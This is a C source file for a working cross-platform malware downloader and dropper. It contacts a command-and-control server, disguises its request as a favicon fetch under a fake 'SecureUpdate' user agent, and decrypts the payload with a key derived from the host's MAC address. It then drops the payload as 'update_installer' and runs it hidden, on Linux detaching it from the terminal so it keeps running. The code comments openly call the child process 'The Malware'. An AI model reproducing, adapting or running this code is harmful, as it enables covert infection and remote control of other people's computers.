#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ================= WINDOWS HEADERS =================
#ifdef _WIN32
    #include <windows.h>
    #include <winhttp.h>
    #include <iphlpapi.h>
    #include <shellapi.h>
    #pragma comment(lib, "winhttp.lib")
    #pragma comment(lib, "iphlpapi.lib")
    #pragma comment(lib, "shell32.lib")

// ================= LINUX HEADERS =================
#elif __linux__
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <net/if.h>
    #include <sys/ioctl.h>
    #include <netdb.h>
    #include <sys/stat.h>
    #include <fcntl.h> // Required for open()
#endif

// DEFAULTS
#define DEFAULT_IP "127.0.0.1"
#define DEFAULT_PORT 8080
#define C2_PATH L"/favicon.ico"
#define C2_PATH_LINUX "/favicon.ico"
#define USER_AGENT L"SecureUpdate/1.0"
#define USER_AGENT_LINUX "SecureUpdate/1.0"

// ================= MAC ADDRESS LOGIC =================
void GetMacAddress(unsigned char* mac) {
#ifdef _WIN32
    PIP_ADAPTER_INFO pAdapterInfo;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    pAdapterInfo = (PIP_ADAPTER_INFO)malloc(sizeof(IP_ADAPTER_INFO));
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (PIP_ADAPTER_INFO)malloc(ulOutBufLen);
    }
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        memcpy(mac, pAdapterInfo->Address, 6);
    }
    free(pAdapterInfo);
#elif __linux__
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strcpy(s.ifr_name, "eth0"); 
    if (ioctl(fd, SIOCGIFHWADDR, &s) == 0) {
        memcpy(mac, s.ifr_addr.sa_data, 6);
    } else {
        strcpy(s.ifr_name, "wlan0");
        if (ioctl(fd, SIOCGIFHWADDR, &s) == 0) {
            memcpy(mac, s.ifr_addr.sa_data, 6);
        }
    }
    close(fd);
#endif
}

// ================= UNIVERSAL DROP & EXECUTE =================
void DropAndExecute(unsigned char* data, int size) {
    char filepath[512];

#ifdef _WIN32
    // --- Windows Implementation ---
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    sprintf(filepath, "%s%s", tempPath, "update_installer.exe");
    printf("[*] Dropping to: %s\n", filepath);

    FILE* fp = fopen(filepath, "wb");
    if (fp) {
        fwrite(data, 1, size, fp);
        fclose(fp);
        
        // Use ShellExecute with SW_HIDE to run invisible
        printf("[*] Executing Payload (Hidden)...\n");
        ShellExecuteA(NULL, "open", filepath, NULL, NULL, SW_HIDE);
    }

#elif __linux__
    // --- Linux Implementation (The Permanent Fix) ---
    sprintf(filepath, "/tmp/update_installer");
    printf("[*] Dropping to: %s\n", filepath);

    FILE* fp = fopen(filepath, "wb");
    if (fp) {
        fwrite(data, 1, size, fp);
        fclose(fp);

        // 1. Make Executable
        chmod(filepath, 0755);

        printf("[*] Daemonizing Payload...\n");

        // 2. Fork Process
        pid_t pid = fork();

        if (pid < 0) {
            printf("[-] Fork failed\n");
            exit(1);
        }

        if (pid > 0) {
            // PARENT: Exit immediately.
            // This returns control to the terminal while the child keeps running.
            printf("[+] Payload detached. PID: %d\n", pid);
            exit(0);
        }

        // --- CHILD PROCESS (The Malware) ---
        
        // 3. Create New Session (The Magic Fix)
        // This detaches the process from the terminal. 
        // Closing the terminal will NOT kill this process anymore.
        setsid(); 

        // 4. Redirect IO to /dev/null
        // This prevents the payload from crashing if it tries to print to a closed terminal.
        int devNull = open("/dev/null", O_RDWR);
        dup2(devNull, STDIN_FILENO);
        dup2(devNull, STDOUT_FILENO);
        dup2(devNull, STDERR_FILENO);
        close(devNull);

        // 5. Execute
        execl(filepath, filepath, NULL);
        
        // If we reach here, execution failed
        exit(1);
    }
#endif
}

// ================= MAIN LOGIC =================
int main(int argc, char* argv[]) {
    char* targetIP = DEFAULT_IP;
    int targetPort = DEFAULT_PORT;
    if (argc > 1) targetIP = argv[1];
    if (argc > 2) targetPort = atoi(argv[2]);

    printf("[*] Configuration: Connecting to %s:%d\n", targetIP, targetPort);

    // Get MAC
    unsigned char macKey[6] = {0};
    GetMacAddress(macKey);
    printf("[*] Detected MAC: %02X-%02X-%02X-%02X-%02X-%02X\n", 
        macKey[0], macKey[1], macKey[2], macKey[3], macKey[4], macKey[5]);

    // Download Logic
    unsigned char* buffer = NULL;
    int fileSize = 0;

#ifdef _WIN32
    wchar_t wIP[256];
    mbstowcs(wIP, targetIP, 256);
    HINTERNET hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, wIP, targetPort, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", C2_PATH, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        WinHttpReceiveResponse(hRequest, NULL);
        DWORD dwSize = 0, dwDownloaded = 0;
        WinHttpQueryDataAvailable(hRequest, &dwSize);
        buffer = (unsigned char*)malloc(dwSize);
        WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded);
        fileSize = dwDownloaded;
    }
#elif __linux__
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(targetPort);
    if(inet_pton(AF_INET, targetIP, &serv_addr.sin_addr)<=0) return -1;
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("[-] Failed to connect\n");
        return 1;
    }

    char request[512];
    sprintf(request, "GET %s HTTP/1.0\r\nUser-Agent: %s\r\nHost: %s\r\n\r\n", C2_PATH_LINUX, USER_AGENT_LINUX, targetIP);
    send(sock, request, strlen(request), 0);

    // Buffer increased for large payloads
    unsigned char tempBuf[5000000]; 
    int valread = read(sock, tempBuf, sizeof(tempBuf));
    
    int header_end = 0;
    for(int i=0; i < valread-3; i++){
        if(tempBuf[i] == '\r' && tempBuf[i+1] == '\n' && tempBuf[i+2] == '\r' && tempBuf[i+3] == '\n'){
            header_end = i + 4;
            break;
        }
    }
    fileSize = valread - header_end;
    if (fileSize > 0) {
        buffer = (unsigned char*)malloc(fileSize);
        memcpy(buffer, &tempBuf[header_end], fileSize);
    }
    close(sock);
#endif

    if (fileSize > 0 && buffer != NULL) {
        printf("[+] Downloaded %d bytes.\n", fileSize);

        // Decrypt
        for (int i = 0; i < fileSize; i++) {
            buffer[i] = buffer[i] ^ macKey[i % 6];
        }
        printf("[+] Decrypted.\n");

        // DROP AND EXECUTE
        DropAndExecute(buffer, fileSize);
        
    } else {
        printf("[-] Failed to download payload.\n");
    }
    return 0;
}